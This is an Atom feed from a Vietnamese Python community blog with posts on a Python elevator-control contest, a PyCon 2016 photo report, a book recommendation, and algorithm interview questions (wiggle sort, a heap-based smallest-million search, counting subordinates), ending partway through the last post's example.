<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>Python Cho Người Việt</title><link href="/" rel="alternate"></link><link href="/feeds/all.atom.xml" rel="self"></link><id>/</id><updated>2016-06-23T13:58:00+07:00</updated><entry><title>Điều khiển thang máy</title><link href="/2016/06/dieu-khien-thang-may.html" rel="alternate"></link><published>2016-06-23T13:58:00+07:00</published><updated>2016-06-23T13:58:00+07:00</updated><author><name>Nhóm PCNV</name></author><id>tag:None,2016-06-23:/2016/06/dieu-khien-thang-may.html</id><summary type="html">&lt;p&gt;&lt;strong&gt;Cập nhật:&lt;/strong&gt; Do số lượng bài tham gia vẫn còn ít (dẫn đến cuộc thi đua không còn thú vị nữa) nên ban tổ chức dời lại hạn nộp bài đến &lt;strong&gt;hết ngày 21 tháng 07&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Nhân việc PyCon vừa qua, nhóm PCNV hân hạnh tổ chức cuộc thi &lt;strong&gt;Điều …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;strong&gt;Cập nhật:&lt;/strong&gt; Do số lượng bài tham gia vẫn còn ít (dẫn đến cuộc thi đua không còn thú vị nữa) nên ban tổ chức dời lại hạn nộp bài đến &lt;strong&gt;hết ngày 21 tháng 07&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Nhân việc PyCon vừa qua, nhóm PCNV hân hạnh tổ chức cuộc thi &lt;strong&gt;Điều khiển thang máy!&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Tương tự như cuộc thi &lt;a class="reference external" href="http://www.vithon.org/2010/11/26/tranh-tai-bắn-suồng"&gt;Bắn suồng&lt;/a&gt;, cuộc thi &lt;strong&gt;Điều khiển thang máy&lt;/strong&gt; cũng là một cuộc thi lập trình &lt;strong&gt;Python&lt;/strong&gt; và có một số điều lệ sau:&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;Trò chơi được giới thiệu tại &lt;a class="reference external" href="http://codelift.org"&gt;http://codelift.org&lt;/a&gt;. Người tham dự có thể thử mã của mình tại trang mạng đó.&lt;/li&gt;
&lt;li&gt;Người tham gia phải nộp mã Python (tập tin &lt;strong&gt;.py&lt;/strong&gt;) tới &lt;strong&gt;admin+codelift&amp;#64;vithon.org&lt;/strong&gt;, và đồng ý với việc nhóm PCNV có toàn quyền sử dụng mã đó cho mọi mục đích.&lt;/li&gt;
&lt;li&gt;Người tham gia cũng phải gửi thêm một bài viết (dưới dạng &lt;strong&gt;.txt&lt;/strong&gt;) giới thiệu trò chơi, và cách giải của mình đến cùng địa chỉ thư trên.&lt;/li&gt;
&lt;li&gt;Hạn nhận bài là &lt;strong&gt;ngày 14 tháng 07 năm 2016.&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Bài thi sẽ được đọc qua trước, và sẽ được chạy trên cùng hệ thống codelift.org.&lt;/li&gt;
&lt;li&gt;Bài thi với số điểm trung bình cao nhất trong &lt;strong&gt;3 tòa nhà&lt;/strong&gt; được chọn khi chấm sẽ là bài thắng giải.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Ba&lt;/strong&gt; phần thưởng dành cho ba bài thi với số điểm trung bình cao nhất là ba cái áo thun và một số miếng dán mà bạn Nam đã gửi cho nhóm từ PyCon. Người hạng nhất sẽ được quyền chọn mẫu áo trước, rồi đến hạng nhì, và hạng ba. Mẫu áo đã được công bố trong &lt;a class="reference external" href="https://drive.google.com/folderview?id=0B4aYVYJVZM_zT2tzZGdTNTUwQWc&amp;amp;usp=sharing"&gt;thư mục chia sẻ&lt;/a&gt; ở bài trước.&lt;/li&gt;
&lt;li&gt;Quyết định của ban tổ chức là cuối cùng.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Mọi thắc mắc và thảo luận xin hãy dùng &lt;a class="reference external" href="forum.vithon.org"&gt;diễn đàn&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Chúc may mắn và nhiều niềm vui!&lt;/p&gt;
</content><category term="t-shirt"></category><category term="python"></category><category term="codelift"></category></entry><entry><title>PyCon 2016 ở thành phố Portland</title><link href="/2016/06/pycon-2016-o-thanh-pho-portland.html" rel="alternate"></link><published>2016-06-12T18:07:00+07:00</published><updated>2016-06-12T18:07:00+07:00</updated><author><name>Nguyễn Thành Nam</name></author><id>tag:None,2016-06-12:/2016/06/pycon-2016-o-thanh-pho-portland.html</id><summary type="html">&lt;p&gt;Hai tuần trước mình có tham dự hội thảo PyCon 2016 ở thành phố Portland, tiểu bang Oregon, vùng Tây Bắc nước Mỹ.&lt;/p&gt;
&lt;p&gt;Cũng như mọi năm, PyCon vẫn là hội thảo tuyệt vời nhất từ trước đến nay. Tham dự hội thảo không chỉ có lập trình viên mà …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Hai tuần trước mình có tham dự hội thảo PyCon 2016 ở thành phố Portland, tiểu bang Oregon, vùng Tây Bắc nước Mỹ.&lt;/p&gt;
&lt;p&gt;Cũng như mọi năm, PyCon vẫn là hội thảo tuyệt vời nhất từ trước đến nay. Tham dự hội thảo không chỉ có lập trình viên mà còn có nhiều nhà khoa học, giáo viên, sinh viên, và cả học sinh tiểu học nữa! Mình chưa từng thấy hội thảo khoa học kỹ thuật nào mà có thể quy tập được nhiều đối tượng tham gia như vậy.&lt;/p&gt;
&lt;p&gt;Một điều tuyệt vời nữa là có rất nhiều các bạn nam, các bạn nữ, và cả các bạn chuyển giới tham gia PyCon. Điều này cho thấy Python không chỉ là một ngôn ngữ &amp;quot;có sẵn pin&amp;quot;, mà có còn là một cộng đồng rất &amp;quot;bao gồm&amp;quot;. Ai cũng được hoan nghênh, ai cũng được đối xử một cách tôn trọng, không có sự phân biệt đối xử.&lt;/p&gt;
&lt;p&gt;Sau đây là một số hình ảnh mình ghi lại để chia sẻ cùng các bạn. Hy vọng một dịp nào đó sẽ gặp được các bạn ở trong các kỳ hội thảo trong tương lai:&lt;/p&gt;
&lt;p&gt;&lt;a class="reference external" href="https://drive.google.com/uc?export=download&amp;amp;id=0B4aYVYJVZM_zUU9DNkpxYWt5Smc"&gt;Bảng hiệu PyCon 2016 ở dọc đường đến trung tâm hội nghị Portland.&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="reference external" href="https://drive.google.com/uc?export=download&amp;amp;id=0B4aYVYJVZM_zX3VIeEpKd3FpWWs"&gt;Em bé đứng nhìn tượng Martin Luther King, Jr. ở trước trung tâm hội nghị.&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="reference external" href="https://drive.google.com/uc?export=download&amp;amp;id=0B4aYVYJVZM_zUE13c2xUUk16eUE"&gt;Hội trường chính, nơi diễn ra các bài tham luận chủ chốt.&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Các bạn có thể thấy con lắc biểu tượng của trung tâm hội nghị Portland trong hai hình sau:&lt;/p&gt;
&lt;p&gt;&lt;a class="reference external" href="https://drive.google.com/uc?export=download&amp;amp;id=0B4aYVYJVZM_zbnk2VUNOaUlJYm8"&gt;Khu đăng ký (hình 1).&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="reference external" href="https://drive.google.com/uc?export=download&amp;amp;id=0B4aYVYJVZM_zT1NhYmNRb2VXaDA"&gt;Khu đăng ký (hình 2).&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="reference external" href="https://drive.google.com/uc?export=download&amp;amp;id=0B4aYVYJVZM_zTVl3Z1lpSTRNUDQ"&gt;Khu vực phòng Oregon (hình 1).&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="reference external" href="https://drive.google.com/uc?export=download&amp;amp;id=0B4aYVYJVZM_zcE1aVGRnbHAwb1k"&gt;Khu vực phòng Oregon (hình 2).&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="reference external" href="https://drive.google.com/uc?export=download&amp;amp;id=0B4aYVYJVZM_zam1VeDduZEhidWc"&gt;Khu vực phòng Oregon (hình 3).&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="reference external" href="https://drive.google.com/uc?export=download&amp;amp;id=0B4aYVYJVZM_zUWRiUXlOamdkV0E"&gt;Khu vực phòng Oregon (hình 4).&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="reference external" href="https://drive.google.com/uc?export=download&amp;amp;id=0B4aYVYJVZM_zZTZBOUtCenN4cGs"&gt;Khu vực phòng Portland (hình 1).&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="reference external" href="https://drive.google.com/uc?export=download&amp;amp;id=0B4aYVYJVZM_zbGpDZkpsRUh2bEk"&gt;Khu vực phòng Portland (hình 2).&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="reference external" href="https://drive.google.com/uc?export=download&amp;amp;id=0B4aYVYJVZM_zemFaTWJYSVg0Z00"&gt;Hình Guido bắt đầu bài tham luận chính.&lt;/a&gt; Guido vẫn mặc chiếc áo bé gái như mọi năm. Không biết cái áo này sẽ còn theo Guido đến PyCon năm nào đây. Điều này cũng cho thấy Guido rất quan tâm đến sự đối xử bình đẳng, tôn trọng giới tính ở hội thảo PyCon.&lt;/p&gt;
&lt;p&gt;&lt;a class="reference external" href="https://drive.google.com/uc?export=download&amp;amp;id=0B4aYVYJVZM_zSGZHeEx1VF9jSTQ"&gt;Bảng đăng ký không gian mở (open spaces) ở hội thảo.&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="reference external" href="https://drive.google.com/uc?export=download&amp;amp;id=0B4aYVYJVZM_zT19tZ0k5dl9kLVE"&gt;Ảnh trưng bày (poster session) (hình 1).&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="reference external" href="https://drive.google.com/uc?export=download&amp;amp;id=0B4aYVYJVZM_zRUhseUdyVnhRbXM"&gt;Ảnh trưng bày (poster session) (hình 2).&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Hai hình ảnh của tác giả bài viết:&lt;/p&gt;
&lt;p&gt;&lt;a class="reference external" href="https://drive.google.com/uc?export=download&amp;amp;id=0B4aYVYJVZM_zVjR0RVZncHoySVU"&gt;Ảnh đẹp nhất hội thảo (hình 1).&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="reference external" href="https://drive.google.com/uc?export=download&amp;amp;id=0B4aYVYJVZM_zWWxNZlZTMWg3NFU"&gt;Ảnh đẹp nhất hội thảo (hình 2).&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Toàn bộ các hình ảnh có thể được truy cập trong thư mục &lt;a class="reference external" href="https://drive.google.com/folderview?id=0B4aYVYJVZM_zT2tzZGdTNTUwQWc&amp;amp;usp=sharing"&gt;https://drive.google.com/folderview?id=0B4aYVYJVZM_zT2tzZGdTNTUwQWc&amp;amp;usp=sharing&lt;/a&gt;.&lt;/p&gt;
</content><category term="pycon"></category></entry><entry><title>Sách "Python rất là cơ bản"</title><link href="/2015/11/sach-python-rat-la-co-ban.html" rel="alternate"></link><published>2015-11-18T17:16:00+07:00</published><updated>2015-11-18T17:16:00+07:00</updated><author><name>Nhóm PCNV</name></author><id>tag:None,2015-11-18:/2015/11/sach-python-rat-la-co-ban.html</id><summary type="html">&lt;p&gt;Bạn &lt;strong&gt;Võ Duy Tuấn&lt;/strong&gt; có thực hiện một quyển sách về Python với tựa đề &lt;strong&gt;Python rất là cơ bản&lt;/strong&gt;. Nhóm PCNV  xin giới thiệu cùng các bạn.&lt;/p&gt;
&lt;p&gt;&lt;a class="reference external" href="http://bloghoctap.com/python/download-sach-python-rat-la-co-ban.html"&gt;http://bloghoctap.com/python/download-sach-python-rat-la-co-ban.html&lt;/a&gt;&lt;/p&gt;
</summary><content type="html">&lt;p&gt;Bạn &lt;strong&gt;Võ Duy Tuấn&lt;/strong&gt; có thực hiện một quyển sách về Python với tựa đề &lt;strong&gt;Python rất là cơ bản&lt;/strong&gt;. Nhóm PCNV  xin giới thiệu cùng các bạn.&lt;/p&gt;
&lt;p&gt;&lt;a class="reference external" href="http://bloghoctap.com/python/download-sach-python-rat-la-co-ban.html"&gt;http://bloghoctap.com/python/download-sach-python-rat-la-co-ban.html&lt;/a&gt;&lt;/p&gt;
</content></entry><entry><title>Phỏng vấn: Sắp xếp lắc lư</title><link href="/2015/05/phong-van-sap-xep-lac-lu.html" rel="alternate"></link><published>2015-05-05T00:05:00+07:00</published><updated>2015-05-05T00:05:00+07:00</updated><author><name>Nguyễn Thành Nam</name></author><id>tag:None,2015-05-05:/2015/05/phong-van-sap-xep-lac-lu.html</id><summary type="html">&lt;div class="section" id="cau-hoi"&gt;
&lt;h2&gt;Câu hỏi&lt;/h2&gt;
&lt;p&gt;Cho một mảng &lt;strong&gt;A&lt;/strong&gt; các số nguyên &lt;strong&gt;a[i]&lt;/strong&gt;, tìm cách sắp xếp mảng sao cho phần tử thứ nhất nhỏ hơn phần tử thứ hai, phần tử thứ hai lớn hơn phần tử thứ ba, phần tử thứ ba nhỏ hơn phần tử thứ tư v.v …&lt;/p&gt;&lt;/div&gt;</summary><content type="html">&lt;div class="section" id="cau-hoi"&gt;
&lt;h2&gt;Câu hỏi&lt;/h2&gt;
&lt;p&gt;Cho một mảng &lt;strong&gt;A&lt;/strong&gt; các số nguyên &lt;strong&gt;a[i]&lt;/strong&gt;, tìm cách sắp xếp mảng sao cho phần tử thứ nhất nhỏ hơn phần tử thứ hai, phần tử thứ hai lớn hơn phần tử thứ ba, phần tử thứ ba nhỏ hơn phần tử thứ tư v.v... Tức là:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
a[0] &amp;lt;= a[1] &amp;gt;= a[2] &amp;lt;= a[3] &amp;gt;= a[4] ...
&lt;/pre&gt;
&lt;p&gt;Ta gọi một mảng có thứ tự như vậy là một mảng đã được sắp xếp lắc lư (wiggly sorted).&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="phan-tich"&gt;
&lt;h2&gt;Phân tích&lt;/h2&gt;
&lt;p&gt;Ta nhận xét rằng yêu cầu thứ tự chỉ áp dụng vào hai phần tử lân cận của phần tử đang xét. Ví dụ, phần tử &lt;strong&gt;a[1]&lt;/strong&gt; chỉ cần lớn hơn hai phần tử &lt;strong&gt;a[0]&lt;/strong&gt; và &lt;strong&gt;a[2]&lt;/strong&gt;, ngoài ra không còn quan hệ với phần tử nào nữa. Điều đó dẫn đến ý tưởng giải sẽ rất có thể ở dạng tham ăn (&lt;strong&gt;greedy algorithm&lt;/strong&gt;).&lt;/p&gt;
&lt;p&gt;Giả sử như ta đã có mảng &lt;strong&gt;A'&lt;/strong&gt; có độ dài &lt;strong&gt;2n&lt;/strong&gt; (chẵn) thỏa mãn điều kiện. Phần tử kế tiếp (&lt;strong&gt;2n + 1&lt;/strong&gt;) vì ở vị trí lẻ nên sẽ phải nhỏ hơn phần tử cuối cùng trong mảng, đồng thời cũng phải đảm bảo nhỏ hơn phần tử sau đó (&lt;strong&gt;2n + 2&lt;/strong&gt;). Vì ta không biết phần tử (&lt;strong&gt;2n + 2&lt;/strong&gt;) sẽ có giá trị bao nhiêu nên cách an toàn nhất để thỏa mãn hai điều kiện cho phần tử &lt;strong&gt;2n + 1&lt;/strong&gt; là chọn phần tử &lt;strong&gt;nhỏ nhất&lt;/strong&gt; trong số các phần tử còn lại của &lt;strong&gt;A&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Lập luận tương tự cho thấy rằng phần tử ở vị trí &lt;strong&gt;chẵn&lt;/strong&gt; nên có giá trị &lt;strong&gt;lớn nhất&lt;/strong&gt; trong số các phần tử còn lại.&lt;/p&gt;
&lt;p&gt;Tóm lại, cách giải câu hỏi này sẽ bao gồm hai bước chính:&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;Sắp xếp mảng &lt;strong&gt;A&lt;/strong&gt; theo thứ tự tăng dần.&lt;/li&gt;
&lt;li&gt;Lần lượt gán &lt;strong&gt;a[0] = min(A)&lt;/strong&gt;, và &lt;strong&gt;a[1] = max(A[1 : ])&lt;/strong&gt;, và &lt;strong&gt;a[2] = min(A[2 : ])&lt;/strong&gt;, v.v...&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Dĩ nhiên là ta không cần gọi &lt;strong&gt;min&lt;/strong&gt; hay &lt;strong&gt;max&lt;/strong&gt; mà chỉ cần giữ hai biến chỉ mục từ đầu, và cuối mảng &lt;strong&gt;A&lt;/strong&gt; để tìm ngay giá trị cực tiểu hay cực đại vì &lt;strong&gt;A&lt;/strong&gt; đã được sắp xếp ở bước đầu tiên.&lt;/p&gt;
&lt;p&gt;Độ phức tạp thực thi của cách giải này phụ thuộc vào thuộc toán sắp xếp sử dụng ở bước đầu tiên.&lt;/p&gt;
&lt;p&gt;Vấn đề cài đặt cách giải xin được để lại cho bạn đọc. &lt;a class="reference external" href="forum.vithon.org"&gt;Diễn đàn&lt;/a&gt; là nơi tốt nhất để trao đổi về các yếu tố liên quan đến cài đặt.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="tong-ket"&gt;
&lt;h2&gt;Tổng kết&lt;/h2&gt;
&lt;p&gt;Qua loạt bài &lt;strong&gt;Phỏng vấn&lt;/strong&gt;, tác giả hy vọng rằng bạn đọc nhận ra được sự quan trọng của bộ kiến thức nền tảng, đặc biệt là các cấu trúc dữ liệu phổ biến. Từ các kiến thức nền tảng này, chúng ta có thể giải quyết được rất nhiều những vấn đề khác.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Python&lt;/strong&gt; cùng với phương châm &lt;strong&gt;kèm cả pin&lt;/strong&gt; đem đến cho chúng ta một loạt các cấu trúc dữ liệu qua các kiểu, hoặc mô-đun có sẵn. &lt;strong&gt;Python&lt;/strong&gt; thật sự là một công cụ mạnh mẽ và hữu ích.&lt;/p&gt;
&lt;/div&gt;
</content><category term="interview"></category><category term="greedy algorithm"></category></entry><entry><title>Phỏng vấn: Tìm 1 triệu số nhỏ nhất trong 1 tỷ số</title><link href="/2015/04/phong-van-tim-1-trieu-so-nho-nhat-trong-1-ty-so.html" rel="alternate"></link><published>2015-04-30T04:56:00+07:00</published><updated>2015-04-30T04:56:00+07:00</updated><author><name>Nguyễn Thành Nam</name></author><id>tag:None,2015-04-30:/2015/04/phong-van-tim-1-trieu-so-nho-nhat-trong-1-ty-so.html</id><summary type="html">&lt;div class="section" id="cau-hoi"&gt;
&lt;h2&gt;Câu hỏi&lt;/h2&gt;
&lt;p&gt;Cho 1 tỷ số thực, tìm 1 triệu số nhỏ nhất trong 1 tỷ số đấy.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="phan-tich"&gt;
&lt;h2&gt;Phân tích&lt;/h2&gt;
&lt;p&gt;Cách giải đơn giản nhất là sắp xếp từ bé đến lớn 1 tỷ số đầu vào, sau đó chọn ra 1 triệu số đầu tiên. Độ phức tạp của …&lt;/p&gt;&lt;/div&gt;</summary><content type="html">&lt;div class="section" id="cau-hoi"&gt;
&lt;h2&gt;Câu hỏi&lt;/h2&gt;
&lt;p&gt;Cho 1 tỷ số thực, tìm 1 triệu số nhỏ nhất trong 1 tỷ số đấy.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="phan-tich"&gt;
&lt;h2&gt;Phân tích&lt;/h2&gt;
&lt;p&gt;Cách giải đơn giản nhất là sắp xếp từ bé đến lớn 1 tỷ số đầu vào, sau đó chọn ra 1 triệu số đầu tiên. Độ phức tạp của cách giải này phụ thuộc vào độ phức tạp của thuật toán sắp xếp. Cách này có hai nhược điểm lớn: 1. là tốn bộ nhớ để chứa 1 tỷ số đầu vào để sắp xếp, 2. là nếu số lượng đầu vào không có giới hạn thì cách giải này không dùng được.&lt;/p&gt;
&lt;p&gt;Giả sử ta chỉ có 1 triệu số đầu vào, thì rõ ràng kết quả sẽ chính là 1 triệu số đó. Khi có thêm 1 số mới, số mới này sẽ nằm trong kết quả nếu như nó nhỏ hơn số lớn nhất trong 1 triệu số kết quả hiện tại.&lt;/p&gt;
&lt;p&gt;Với nhận xét đó, ta có cách giải thứ hai, tối ưu hơn cách đầu tiên. Ta sẽ tạo một &lt;strong&gt;max heap&lt;/strong&gt; với 1 triệu phần tử. Với mỗi phần tử đầu vào, ta sẽ:&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;Đưa vào heap nếu heap chưa có đủ 1 triệu số&lt;/li&gt;
&lt;li&gt;Nếu heap đã có đủ một triệu số thì lấy từ đỉnh heap ra (tức lấy phần tử lớn nhất trong heap) so sánh với phần tử đầu vào, và đưa lại vào heap phần tử nhỏ hơn trong phép so sánh đó.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Độ phức tạp thực thi của cách giải này là &lt;strong&gt;O(nlogn)&lt;/strong&gt; nhưng chỉ tốn bộ nhớ tỷ lệ với số phần tử đầu ra.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="cai-dat"&gt;
&lt;h2&gt;Cài đặt&lt;/h2&gt;
&lt;p&gt;Ta có thể dùng mô-đun &lt;strong&gt;heapq&lt;/strong&gt; có sẵn để trả lời câu hỏi này. Mô-đun này giúp ta quản lý một &lt;strong&gt;min heap&lt;/strong&gt;. Tuy nhiên, vì ta cần &lt;strong&gt;max heap&lt;/strong&gt; nên các giá trị đầu vào sẽ được đổi thành số bù &lt;strong&gt;0 - x&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# encoding: utf-8&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;heapq&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;solve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;inp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1000000&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;heap&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;inp&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;heap&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;heapq&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;heappush&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;heap&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;m&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;heap&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;m&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="n"&gt;heapq&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;heapreplace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;heap&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;heap&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;

&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;solve&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;
&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;solve&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Mô-đun &lt;strong&gt;heapq&lt;/strong&gt; cũng có sẵn hàm &lt;strong&gt;nsmallest&lt;/strong&gt; để giải quyết câu hỏi này ;).&lt;/p&gt;
&lt;/div&gt;
</content><category term="interview"></category></entry><entry><title>Phỏng vấn: Số nhân viên cấp dưới</title><link href="/2015/04/phong-van-so-nhan-vien-cap-duoi.html" rel="alternate"></link><published>2015-04-10T04:56:00+07:00</published><updated>2015-04-10T04:56:00+07:00</updated><author><name>Nguyễn Thành Nam</name></author><id>tag:None,2015-04-10:/2015/04/phong-van-so-nhan-vien-cap-duoi.html</id><summary type="html">&lt;div class="section" id="cau-hoi"&gt;
&lt;h2&gt;Câu hỏi&lt;/h2&gt;
&lt;p&gt;Cho một từ điển từ chuỗi sang chuỗi, khoá là tên nhân viên, và giá trị là tên của người quản lý. Nhân viên cấp cao nhất báo cáo cho chính họ. Tìm số nhân viên cấp dưới của một nhân viên nào đó.&lt;/p&gt;
&lt;p&gt;Ví dụ: Trong từ …&lt;/p&gt;&lt;/div&gt;</summary><content type="html">&lt;div class="section" id="cau-hoi"&gt;
&lt;h2&gt;Câu hỏi&lt;/h2&gt;
&lt;p&gt;Cho một từ điển từ chuỗi sang chuỗi, khoá là tên nhân viên, và giá trị là tên của người quản lý. Nhân viên cấp cao nhất báo cáo cho chính họ. Tìm số nhân viên cấp dưới của một nhân viên nào đó.&lt;/p&gt;
&lt;p&gt;Ví dụ: Trong từ điển sau, A và B cùng báo cáo cho C, C và E báo cáo cho F, D báo cáo cho E, và F là nhân viên cấp cao nhất:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
{
  &amp;quot;A&amp;quot;: &amp;quot;C&amp;quot;,
  &amp;quot;B&amp;quot;: &amp;quot;C&amp;quot;,
  &amp;quot;C&amp;quot;: &amp;quot;F&amp;quot;,
  &amp;quot;D&amp;quot;: &amp;quot;E&amp;quot;,
  &amp;quot;E&amp;quot;: &amp;quot;F&amp;quot;,
  &amp;quot;F&amp;quot;: &amp;quot;F&amp;quot;,
}
